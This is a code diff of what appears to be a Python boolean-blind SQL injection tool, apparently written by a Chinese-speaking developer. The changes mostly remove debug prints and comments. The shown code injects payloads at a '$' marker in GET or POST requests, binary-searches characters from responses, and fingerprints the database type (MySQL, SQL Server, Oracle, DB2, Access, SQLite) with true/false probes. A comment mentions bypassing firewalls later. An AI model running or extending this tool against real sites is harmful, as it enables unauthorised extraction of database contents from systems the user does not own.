@@ -1,4 +1,3 @@
-from glob import glob
 import sys
 import requests
 from urllib import parse
@@ -41,7 +40,6 @@ def Argparse():
         parser.print_help()
         sys.exit()
     if not args['read']:
-        # args['read'] = './ppack.txt'
         print('请输入数据包所在路径！')
         sys.exit()
     return args
@@ -84,7 +82,6 @@ def analysePack(path):
             line = f.readline()
             if not line:
                 break
-            # print(line,end = '')
             if '$' in line:
                 if row == 1:
                     _pack._hvDollar = IN_GET
@@ -192,23 +189,19 @@ def boolsql(rtPack:pack, sql_stat):
             leftN = 33
         while 1:
             num = (leftN+rightN)//2
-            # print(num,leftN,rightN)
             payload = retDifDbPayload(sql_stat,pos,num)
-            # print(payload)
             if rtPack._hvDollar == IN_GET:
                 payload = parse.quote(payload)
                 rtPack._url = startUrl.replace('$',payload)
             elif rtPack._hvDollar == IN_DATA:
                 # 绕过防火墙，后面再做
-
+                ##
                 rtPack._data[rtPack._KeyInData] = startData.replace('$',payload)
-                # print(payload)
             else:
                 # 暂时不支持其它位置的注入
                 printF('暂时不支持其它位置的注入,程序结束！')
                 exit()
                 
-            # print(rtPack._url)
             rsp = pkSend(rtPack=rtPack)
             # 成功
             if judgeTF(rsp) == True:
@@ -248,7 +241,6 @@ def pkSend(rtPack:pack):
         if rtPack._option == 'GET':
             rsp = sess.get(rtPack._url,headers=rtPack._head,timeout=15)
         elif rtPack._option == 'POST':
-            # print(rtPack.pkPrint())
             rsp = sess.post(rtPack._url,headers=rtPack._head,data=rtPack._data,timeout=15)
         if rsp.status_code == 404:
             printF('status_code: 404,Exit.')
@@ -259,12 +251,10 @@ def pkSend(rtPack:pack):
         exit()
 
 def getPdRsp(rtPack:pack,payload):
-    # print(payload)
     if rtPack._hvDollar == IN_GET:
         rtPack._url = startUrl.replace('$',payload)
     elif rtPack._hvDollar == IN_DATA:
         rtPack._data[rtPack._KeyInData] = startData.replace('$',payload)
-        # print(payload)
     rsp = pkSend(rtPack=rtPack)
     return rsp
 
@@ -306,7 +296,6 @@ def main():
         global JUDGEM
         while judgeTF(getPdRsp(rtPack,'1=1')) == judgeTF(getPdRsp(rtPack,'1=2')):
             JUDGEM = JUDGEM+1   # 调整判断模式
-        # print(Exp720Len)
         # 自动检测
         if ARGV['cdbs'] == False:
             if judgeTF(getPdRsp(rtPack,'length(@@version_compile_os)>0')) == True:
@@ -318,13 +307,13 @@ def main():
             elif judgeTF(getPdRsp(rtPack,'(select count(*) from sysobjects)>0')) == True:
                 printT('Sql Server')
                 DATABASE_TYPE = 2
-            elif judgeTF(getPdRsp(rtPack,'(select count(*) from sys.user_tables)>0')) == True:  # 待测试
+            elif judgeTF(getPdRsp(rtPack,'(select count(*) from sys.user_tables)>0')) == True:
                 printT('Oracle')
                 DATABASE_TYPE = 3
             elif judgeTF(getPdRsp(rtPack,'(select count(*) from sysibm.sysdummy1)>0')) == True:
                 print('DB2')
                 DATABASE_TYPE = 4
-            elif judgeTF(getPdRsp(rtPack,'(select count(*) from msysobjects)>0')) == True:  # 有些问题，如果没有msysobjects表，就不支持自动检测了
+            elif judgeTF(getPdRsp(rtPack,'(select count(*) from msysobjects)>0')) == True:  # 如果没有msysobjects表，就不支持自动检测了
                 printT('Access')
                 DATABASE_TYPE = 5
             elif judgeTF(getPdRsp(rtPack,'length(sqlite_version())>0')) == True:
